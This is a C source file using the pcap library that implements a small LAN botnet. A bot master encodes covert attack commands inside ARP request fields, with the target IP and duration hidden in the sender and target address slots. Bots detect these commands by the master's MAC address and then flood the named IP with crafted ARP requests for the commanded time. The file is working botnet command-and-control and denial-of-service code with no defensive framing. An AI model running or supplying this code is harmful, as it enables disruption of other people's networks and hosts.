#include "utils.h"
#include <string.h>
#include <stdlib.h>
#include "constants.h"
#include <time.h>

#define NPCAP_ERROR printf("NPCAP error message: \"%s\"\n", errbuff);


_Bool is_adapter_availiable(const char* adapter, pcap_if_t* device)
{
    pcap_if_t* node = NULL;

    char code = pcap_findalldevs(&node, errbuff);

    if(code)
    {
        NPCAP_ERROR
        return false;
    }

        
    pcap_if_t* ptr = node;
    //pcap_if_t* prev = node;
    while(ptr)
    {
        if(!strcmp(ptr->name, adapter) || !strcmp(ptr->description, adapter))
        {
            //prev->next = ptr->next;
            *device = *ptr;
            pcap_freealldevs(node);
            return true;
        }  
        
        //prev = ptr;
        ptr = ptr->next;
    }

    pcap_freealldevs(node);
    return false;
}

void print_availiable()
{
    pcap_if_t* node = NULL;

    char code = pcap_findalldevs(&node, errbuff);

    if(code)
    {
        NPCAP_ERROR
        return;
    }

    printf("Devices availiable:\n");

    pcap_if_t* ptr = node;
    while(ptr)
    {
        printf("%s (%s)\n", ptr->name, ptr->description ? ptr->description : "no_description");
        
        ptr = ptr->next;
    }

    pcap_freealldevs(node);
}

void extract_attack_info(const u_char *package, u_char *target_ip, u_char *attack_time)
{
    memcpy(target_ip, package+28, 4);
    memcpy(attack_time, package+38, 4);
}

_Bool is_bot_command(const u_char *package)
{
    _Bool result = true;
    for(int i=0; i<6; i++)
        result &= package[i] == broadcast_mac[i];
    
    for(int i=22; i<28; i++)
        result &= package[i] == bot_master_mac[i-22];
    
    return result;
    //return result && package[12] == *((u_char*)(&bot_ethertype) + 1) && package[13] == *((u_char*)(&bot_ethertype) + 0);
}

void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *bytes)
{
    if(is_bot_command(bytes))
    {
        u_char target_ip[4];
        u_char attack_time[4];
        extract_attack_info(bytes, target_ip, attack_time);
        
        printf("commanded to attack ip: ");
        for(int i=0; i<3; i++)
            printf("%d.", target_ip[i]);
        printf("%d ", target_ip[3]);

        int sec = 0;
        for(int i=0; i<4; i++)
        {
            *((u_char*)(&sec) + 3-i) = attack_time[i];
        }
        printf("for %d seconds\n", sec);

        u_char arp_package[42];
        create_arp_attack(target_ip, bot_node_mac, bot_node_ip, arp_package);
        
        time_t start = time(NULL);
        time_t end = time(NULL);
        while((end-start)!=sec)
        {
            printf("time passed: %d\n", end-start);
            pcap_sendpacket((pcap_t*)user, arp_package, 42);
            end = time(NULL);
        }
    }
}

void create_bot_command(const u_char target_ip[4], int attack_time, u_char real_mac[6], u_char* package)
{
    // broadcast destination
    for(int i=0; i<6; i++)
        package[i] = broadcast_mac[i];
    
    //source address
    for(int i=6; i<12; i++)
        package[i] = real_mac[i-6];

    //ethertype
    package[12] = *((u_char*)(&bot_ethertype) + 1);
    package[13] = *((u_char*)(&bot_ethertype) + 0);
    
    // htype
    package[14] = 0;
    package[15] = 1;

    // ptype
    package[16] = 8;
    package[17] = 0;

    // hsize
    package[18] = 6;

    // ptype
    package[19] = 4;

    // opcode - request
    package[20] = 0;
    package[21] = 1;

    // sha - hiding bot_master_mac 
    for(int i=22; i < 28; i++)
        package[i] = bot_master_mac[i-22];

    // spa - target_ip
    memcpy(package + 28, target_ip, 4);

    // tha
    for(int i=32; i < 38; i++)
        package[i] = 0;
    
    // tpa - attack_time
    for(int i=0; i<4; i++)
        package[38+i] = *((u_char*)(&attack_time) + 3-i);
    
    //padding
    //for(int i=22; i<63; i++)
    //    package[i] = 0;
    
    // FCS calculation
    /*uint32_t fcs = 0;
    for(int i=14; i<22; i+=2)
    {
        uint16_t block = 0;
        *((u_char*)&block + 1) = package[i];
        *((u_char*)&block + 0) = package[i+1];
        fcs += block;
    }
    if(fcs > 65535)
    {
        *((uint16_t*)&fcs + 1) = 0;
        fcs++;
    }
    fcs = ~fcs;

    for(int i=62; i<64; i++)
        package[i] = *((u_char*)&fcs + 63 - i);

    printf("FCS for this package: %x\n", fcs);*/
}

void create_arp_attack(const u_char target_ip[4], const u_char sha[6], const u_char spa[4], u_char* package)
{
    // broadcast destination
    for(int i=0; i<6; i++)
        package[i] = broadcast_mac[i];
    
    //source address
    for(int i=6; i<12; i++)
        package[i] = sha[i-6];
    
    // arp ethertype 0x0806
    package[12] = 8;
    package[13] = 6;

    // Ethernet htype 0x0001
    package[14] = 0;
    package[15] = 1;

    // IPv4 ptype 0x0800
    package[16] = 8;
    package[17] = 0;

    // hsize
    package[18] = 6;

    // psize
    package[19] = 4;

    // Opcode=1 - request
    package[20] = 0;
    package[21] = 1;

    // sha - sender MAC
    for(int i=22; i<28; i++)
        package[i] = sha[i-22];
    
    // spa - sender IP
    for(int i=28; i<32; i++)
        package[i] = spa[i-28];
    
    // tha - target MAC(unknown)
    for(int i=32; i<38; i++)
        package[i] = 0;
    
    // tpa - target IP
    for(int i=38; i<42; i++)
        package[i] = target_ip[i-38];
    
    // FCS calculation
    // todo
}
